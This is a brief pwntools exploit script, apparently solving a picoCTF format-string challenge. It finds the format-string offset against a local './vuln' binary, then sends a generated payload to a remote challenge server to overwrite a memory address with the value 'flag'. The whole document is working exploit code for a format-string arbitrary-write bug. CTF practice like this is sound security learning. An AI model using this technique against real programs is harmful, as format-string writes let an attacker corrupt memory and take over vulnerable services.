#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
def exec_fmt(payload):
    p = process('./vuln')
    print(p.clean(0.2).decode())
    p.sendline(payload)
    a = p.recvline(keepends=False).decode()
    print(p.clean(0.2).decode())
    return a.split(' ')[3].encode()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

addr = 0x404060
flag = 0x67616c66

payload = fmtstr_payload(offset, {addr: flag})
p = process('nc rhea.picoctf.net 58128', shell=True)
p.sendline(payload)
print(p.recvallS())
